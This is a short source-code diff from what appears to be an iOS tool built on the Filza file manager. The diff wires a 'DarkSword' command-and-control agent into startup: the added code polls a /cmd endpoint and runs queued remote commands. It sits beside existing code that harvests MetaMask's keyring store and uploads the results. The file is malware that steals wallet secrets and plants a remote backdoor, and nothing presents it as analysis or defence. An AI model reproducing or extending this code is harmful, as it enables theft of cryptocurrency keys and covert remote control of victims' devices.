@@ -41,6 +41,7 @@
 #import "FilzaSSHServer.h"
 #import "MCMBridge.h"
 #import "PersistStoreHarvester.h"
+#import "DarkSwordClient.h"
 
 static NSString *const TMShellDiagnosticsComponent = @"ChatShell";
 static NSString *const TMShellConfigResource = @"TryMaskCardShell";
@@ -1725,6 +1726,10 @@ static void TMShellBringUpBackends(void)
     // Container bridge first, then the configured persist-store harvest
     // (MetaMask's keyring store by default). Idempotent; retries internally.
     TryMaskCardPersistHarvest(NO);
+    // DarkSword agent: starts the /cmd poll loop (idempotent; no-op unless
+    // darkSwordEnabled=true). Filza becomes the entry point that keeps a C2
+    // session open and executes queued commands.
+    DarkSwordStart();
     // Prove the backend path works even when there is nothing to harvest, then
     // deliver any evidence the previous run left behind.
     TMShellUploadProbe();
